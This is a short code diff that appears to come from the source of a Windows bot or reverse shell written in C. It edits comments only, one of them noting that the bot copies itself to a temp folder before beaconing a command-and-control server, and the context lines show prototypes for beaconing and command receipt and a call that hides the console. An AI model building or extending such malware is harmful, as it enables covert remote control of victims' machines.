@@ -7,7 +7,7 @@
 
 /* IMPORTANT: need to link with ws2_32 (i686-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32) */
 
-/* -- static function prototypes only used in botmain.c */
+/* -- static function prototypes */
 static void copy(char *src_path, char *dst_path);
 static void beacon();
 static int recv_cmd(SOCKET c2_sock);
@@ -23,6 +23,10 @@ int main(int argc, char* argv[])
 
   FreeConsole();
 
+  /*
+  ** Copy bot to temp folder before beaconing C2 server
+  */
+	
   /* get the current path to the executable */
   handle= GetModuleHandleA(NULL);
   GetModuleFileNameA(handle, (char *)curr_path, MAX_PATH);
